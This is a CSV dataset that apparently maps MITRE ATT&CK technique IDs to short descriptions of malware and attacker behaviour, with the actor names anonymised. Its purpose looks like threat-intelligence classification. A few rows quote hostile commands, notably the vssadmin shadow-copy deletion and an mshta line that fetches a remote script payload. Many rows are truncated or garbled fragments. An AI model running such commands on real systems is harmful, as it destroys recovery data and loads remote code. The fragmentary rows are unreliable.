Key,Value
T1600,"Typically, longer keys increase the cost of cryptanalysis, or decryption without the key."
T1138,"However, certain shims can be used to   , inject DLLs into processes , disable Data Execution Prevention  and Structure Exception Handling , and intercept memory addresses ."
T1083,Software creates a backdoor through which remote attackers can retrieve lists of files.
T1027,Software encrypts all strings using RC4 and bundles all functionality into a single function call.
T1594,"Information from these sources may reveal opportunities for other forms of reconnaissance  or ), establishing operational resources  or ), and/or initial access  or )."
T1589,Information about users could also be enumerated via other active means (i.e.
T1110,Attacker has performed brute force attacks against administrator accounts.
T1014,Software is a kernel-mode rootkit that has the ability to hook system calls to hide specific files and fake network and CPU-related statistics to make the CPU load of the infected machine always appear low.
T1189,"Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest."
T1203,Attacker has exploited Adobe Flash vulnerability CVE-2015-8651 for execution.
T1105,"Software has downloaded a variety of modules and payloads to the compromised host, including IcedID and Software."
T1132,Command and control  information can be encoded using a standard data encoding system.
T1197,"), execute, and even clean up after running malicious code (e.g."
T1105,Attacker has downloaded binary data from a specified domain after the malicious document is opened.
T1065,Software uses port 61061 to communicate with the C2 server.
T1068,Attacker has used CVE-2014-6324 and CVE-2017-0213 to escalate privileges.
T1082,"Software collects the OS version, computer name, and language ID."
T1571,"Software has used HTTP over ports 9005 and 9006 for network traffic, 9002 for C2 requests, 33666 as a WebSocket, and 8090 to download files."
T1094,Software uses HTTP POST requests with data formatted using a custom protocol.
T1047,Software may use WMI when collecting information about a victim.
T1083,Attacker has monitored files' modified time.
T1043,Software uses Port Numbers 443 and 80 for the C2 server.
T1083,Attacker has used WizTree to obtain network files and directory listings.
T1115,Software starts a thread on execution that captures clipboard data and logs it to a predefined log file.
T1112,Software can add the following registry entry: <code>HKEY_CURRENT_USER\SOFTWARE\{8 random characters}</code>.
T1110,During the Attacker used a script to attempt RPC authentication against a number of hosts.
T1057,"During , the threat actors used `tasklist` to collect a list of running processes on an infected system."
T1082,"Software can collect the hostname, Microsoft Windows version, and processor architecture from a victim machine."
T1057,Software can enumerate and exclude selected processes on a compromised host to speed execution of memory scraping.
T1083,"Software searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip. It can also obtain browsing history, cookies, and plug-in information."
T1057,Software can list running processes.
T1485,Attacker has used a custom secure delete function to make deleted files unrecoverable.
T1105,Software downloaded several staged items onto the victim's machine.
T1029,Software can sleep when instructed to do so by the C2.
T1016,Attacker has used <code>ipconfig</code> and <code>arp</code> to determine network configuration information.
T1124,Software can compare the current time on an infected host with a configuration value to determine when to start the encryption process.
T1584,"Infrastructure solutions include physical or cloud servers, domains, network devices, and third-party web and DNS services."
T1106,Software has used several Win32 API functions to interact with the victim machine.
T1082,"Software gathers the name of the local host, version of GNU Compiler Collection , and the system information about the CPU, machine, and operating system."
T1140,Software can decrypt its payload via a XOR key.
T1027,Software can be partly encrypted with XOR.
T1140,Software has decrypted an AES encrypted binary file to trigger the download of other files.
T1140,"Software uses a decode routine combining bit shifting and XOR operations with a variable key that depends on the length of the string that was encoded. If the computation for the variable XOR key turns out to be 0, the default XOR key of 0x1B is used. This routine is also referenced as the `rotate` function in reporting."
T1106,The file collection tool used by Software can utilize native API including <code>ReadDirectoryChangeW</code> for folder monitoring.
T1189,"Attacker has used drive-by downloads for initial infection, often using fake browser updates as a lure."
T1106,Software can use Native API for execution and to retrieve active services.
T1486,Attacker encrypts files in victim environments as part of ransomware operations.
T1112,Software can write its configuration file to <code>Software\Classes\scConfig</code> in either <code>HKEY_LOCAL_MACHINE</code> or <code>HKEY_CURRENT_USER</code>.
T1057,Information about processes can also be extracted from the output of  calls such as <code>CreateToolhelp32Snapshot</code>.
T1056,APT34 has used a keylogging tool called KEYPUNCH.
T1128,The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\SOFTWARE\Microsoft\Netsh</code>.
T1219,Attacker has established tmate sessions for C2 communications.
T1134,administrator) to steal a token.
T1480,Software can check its current working directory and for the presence of a specific file and terminate if specific values are not found.
T1505,Adversaries may install malicious components to extend and abuse server applications.
T1012,Software can check the default browser by querying <code>HKCR\http\shell\open\command</code>.
T1095,Software has the ability to use TCP for external C2.
T1208,"Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline  attacks that may expose plaintext credentials."
T1534,"For example, adversaries may leverage  or  as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through  on sites that mimic login interfaces."
T1140,Software malware.
T1208,"Cracked hashes may enable Persistence, Privilege Escalation, and  Lateral Movement via access to ."
T1027,"During Software and Software, into multiple sections on disk to evade detection."
T1016,Attacker collected MAC addresses from victim machines.
T1110,Attacker used brute-force attack to obtain login data.
T1083,Software can enumerate files and directories on a compromised host.
T1190,"Attacker has exploited the Log4j utility , on-premises MS Exchange servers via ""ProxyShell"" , and Fortios SSL VPNs ."
T1007,Software collects a list of install programs and services on the system’s machine.
T1189,Software through a fake blog website.
T1113,Software takes screenshots of the compromised system's desktop and saves them to <code>C:\system\screenshot.bmp</code> for exfiltration every 60 minutes.
T1033,Software can identify the username on a compromised host.
T1041,Software can upload files over the C2 channel.
T1591,Attacker has studied publicly available information about a targeted organization to tailor spearphishing efforts against specific departments and/or individuals.
T1203,Attacker has used RTF document that includes an exploit to execute malicious code.
T1120,Software can identify peripheral devices on targeted systems.
T1173,"Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links , hot data links , and requests for command execution."
T1033,Software can collect the username from the victim’s machine.
T1095,Software has used UDP for C2 communications.
T1013,A port monitor can be set through the   API call to set a DLL to be loaded at startup.
T1497,Software  includes runtime checks to identify an analysis environment and prevent execution on it.
T1140,"Software installation includes binary code stored in a file located in a hidden directory, such as <code>shell.txt</code>, that is decrypted then executed. Software uses hexadecimal-encoded shellcode payloads during installation that are called via Windows API <code>CallWindowProc</code> to decode and then execute."
T1105,"During Software and Software, as well as Software and Software ransomware onto the victim network."
T1027,Software has the ability to obfuscate strings using XOR encryption.
T1070,Software will delete an associated registry key if a certain server response is received.
T1008,"Software tests if it can reach its C2 server by first attempting a direct connection, and if it fails, obtaining proxy settings and sending the connection through a proxy, and finally injecting code into a running browser if the proxy method fails."
T1518,"Such software may be deployed widely across the environment for configuration management or security reasons, such as , and may allow adversaries broad access to infect devices or move laterally."
T1543,Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.
T1005,Software can collect files and information from a compromised host.
T1105,Attacker used executables to download malicious files from different sources.
T1129,The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention  network paths.
T1036,Software can disguise JavaScript files as PDFs.
T1064,"Attacker used Visual Basic Scripts , JavaScript code, batch files, and .SCT files on victim machines."
T1083,Software can list files and directories on a compromised host.
T1611,Software can gain a reverse shell on a host node by mounting the Kubernetes hostPath.
T1083,"Attacker has run scripts to enumerate recently modified documents having either a .pdf, .doc, .docx, .xls or .xlsx extension."
T1222,Adversaries may modify file or directory permissions/attributes to evade access control lists  and access protected files.
T1578,"A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots."
T1189,Attacker has used watering holes to deliver files with exploits to initial victims.
T1140,Software has decoded strings from the C2 server before executing commands.
T1622,"Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process ."
T1013,"The Registry key contains entries for the following:

* Local Port
* Standard TCP/IP Port
* USB Monitor
* WSD Port

Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM."
T1140,"Software's loader can decrypt the backdoor code, embedded within the loader or within a legitimate PNG file. A custom XOR cipher or RC4 is used for decryption."
T1622,Software can use the `CheckRemoteDebuggerPresent` function to detect the presence of a debugger.
T1005,Attacker has exfiltrated data from a compromised machine.
T1129,Software can load DLLs into memory.
T1531,"In Linux, the <code>passwd</code> utility may be used to change passwords."
T1608,"Staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including :

* Staging web resources necessary to conduct  when a user browses to a site."
T1095,Software communicates with a simple network protocol over TCP.
T1057,Software can list running processes on the system.
T1070,Software's loader can delete scheduled tasks created by a previous instance of the malware.
T1600,"For example, through behaviors such as , , and , an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic."
T1049,Software has retrieved a GUID associated with a present LAN connection on a compromised machine.
T1652,Information about device drivers ) may also be available in the Registry.
T1216,This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.
T1063,This may include things such as local firewall rules and anti-virus.
T1020,Software has the ability to manage an automated queue of egress files and commands sent to its C2.
T1003,Software can dump credentials from victim browsers.
T1027,"Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled."
T1008,Software creates a backdoor through which remote attackers can change C2 servers.
T1007,Software can create and register a service for execution.
T1046,Attacker has used nmap from a router VM to scan ports on systems within the restricted segment of an enterprise network.
T1036,Software dropped a decoy payload with a .jpg extension that contained a malicious Visual Basic script.
T1572,Tunneling involves explicitly encapsulating a protocol within another.
T1022,Common file archive formats that can encrypt files are RAR and zip.
T1486,"Software can encrypt files on a compromised host with RC6, and encrypts the key with RSA-1024."
T1560,Attacker compressed data into .zip files prior to exfiltrating it.
T1057,Software can list processes on targeted hosts.
T1070,Software to remove artifacts from victims.
T1125,Software uses the Skype API to record audio and video calls. It writes encrypted data to <code>%APPDATA%\Intel\Skype</code>.
T1005,Software can upload files from a compromised host.
T1016,"Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems."
T1105,Software has been used to download a Python interpreter to `C:\Users\Public\WinTN\WinTN.exe` as well as other plugins from external sources.
T1057,Software is capable of performing process listings.
T1124,"In addition, system calls – such as <code>time</code> – have been used to collect the current time on Linux devices."
T1140,Software can use a decryption mechanism to process a user supplied password and allow execution.
T1105,Software has the ability to download additional components and malware.
T1083,Software can search for files in directories.
T1018,The Software command and execution module can perform target system enumeration.
T1485,Software can work alphabetically through drives on a compromised system to take ownership of and overwrite all files.
T1112,Software can make modifications to Registry keys.
T1105,can download and execute a second-stage payload.
T1083,Attacker has used a batch script to gather folder and file names from victim hosts.
T1105,Software can download additional files to a targeted system.
T1046,Software can initiate a port scan against a given IP address.
T1170,"There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code      

Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(""GetObject(""""script:https//webserver/payload[."
T1095,Software can establish an indirect and raw TCP socket-based connection to the C2 server.
T1105,"On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`."
T1554,"Software uses a malicious browser application to replace the legitimate browser in order to continuously capture credentials, monitor web traffic, and download additional modules."
T1030,During Software's bandwidth setting during exfiltration.
T1090,"During , threat actors used a custom proxy tool called ""Agent"" which has support for multiple hops."
T1025,"Software can find, encrypt, and upload files from fixed and removable drives."
T1082,Software uses the <code>cat /proc/cpuinfo | grep -c “cpu family” 2>&1</code> command to gather system information.
T1556,Software can create a backdoor in KeePass using a malicious config file and in TortoiseSVN using a registry hook.
T1105,Software can download additional modules and payloads.
T1158,"### Mac

Files on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app ."
T1057,Attacker surveys a system upon check-in to discover running processes using the <code>tasklist /v</code> command. Attacker RPC backdoors have also enumerated processes associated with specific open ports or named pipes.
T1140,Attacker has extracted tar.gz files after downloading them from a C2 server.
T1047,Attacker has used WMIC to execute commands on remote computers.
T1210,"Software can use two exploits in SMBv1, EternalBlue and EternalRomance, to spread itself to other remote systems on the network."
T1045,A virtual machine is then called to run this code.
T1047,During Software.
T1514,) This technique may be combined with  to trick the user into granting escalated privileges to malicious code.
T1140,Attacker has utilized `certutil` to decode base64 encoded versions of custom malware.
T1113,Software has taken screenshots every five minutes and saved them to the user's local Application Data folder under `Temp\SymbolSourceSymbols\icons` or `Temp\ModeAuto\icons`.
T1016,"Software gathers the victim's IP address and domain information, and then sends it to its C2 server."
T1112,Software has a function to write itself to Registry values.
T1046,Attacker has used the SNScan tool to find other potential targets on victim networks.
T1505,Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems.
T1041,Software has sent user and system information to a C2 server via HTTP POST requests.
T1102,Attacker has incorporated at least five different cloud service providers into their C2 infrastructure including CloudMe.
T1041,Software exfiltrates data stolen from a system over its C2 channel.
T1125,Software can capture camera video as part of its collection process.
T1194,"All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry."
T1083,"A module in Software collects information about the paths, size, and creation time of files with specific file extensions, but not the actual content of the file."
T1571,"Software communicates over ports 80, 443, 53, and 8080 via raw sockets instead of the protocols usually associated with the ports."
T1552,"Software can search for sensitive data: for example, in Code Build environment variables, EC2 user data, and Cloud Formation templates."
T1217,Software has the ability to gather browser data such as bookmarks and visited sites.
T1176,Attacker victims are prompted to install malicious Google Chrome extensions which gave the threat actor the ability to read data from any website accessed.
T1132,Software provides various transform functions to encode and/or randomize C2 data.
T1490,Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.
T1029,Software contacts its C2 based on a scheduled timing set in its configuration.
T1027,"Software has obfuscated strings such as antivirus vendor names, domains, files, and others."
T1095,Software can use ICMP to receive information on the destination server.
T1175,"DCOM can also execute macros in existing documents  and may also invoke   execution directly through a COM created instance of a Microsoft Office application , bypassing the need for a malicious document."
T1105,Software downloads a tar compressed archive from a download server to the system.
T1059,Software can receive a command line argument to limit file encryption to specified directories.
T1033,Software gathers the victim username.
T1023,Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.
T1223,Adversaries may abuse this technology to conceal malicious code.
T1495,"Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system."
T1055,Software can inject content into lsass.exe to load a module.
T1033,"The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs."
T1105,Software has been used to load Software onto a compromised host.
T1018,Software implant to gather information about remote systems on the network.
T1025,Adversaries may search connected removable media on computers they have compromised to find files of interest.
T1168,"### launchd

Each launchd job is described by a different configuration property list  file similar to  or , except there is an additional key called <code>StartCalendarInterval</code> with a dictionary of time values."
T1219,Attacker has used several remote administration tools as persistent infiltration channels.
T1140,"Software uses a unique, custom de-obfuscation technique."
T1665,"This can be accomplished in various ways including by identifying and filtering traffic from defensive tools, masking malicious domains to obfuscate the true destination from both automated scanning tools and security researchers, and otherwise hiding malicious artifacts to delay discovery and prolong the effectiveness of adversary infrastructure that could otherwise be identified, blocked, or taken down entirely."
T1124,Software can collect the current timestamp of the victim's machine.
T1083,Software has the capability to obtain file and directory listings.
T1571,"For example, Registry keys and other configuration settings can be used to modify protocol and port pairings."
T1057,Software has a command to perform a process listing.
T1600,Adversaries can compromise and manipulate devices that perform encryption of network traffic.
T1082,"Attacker collected information about the infected host, including the machine names and OS architecture."
T1490,Software can delete system restore points through the command <code>cmd.exe /c vssadmin delete shadows /for=c: /all /quiet”</code>.
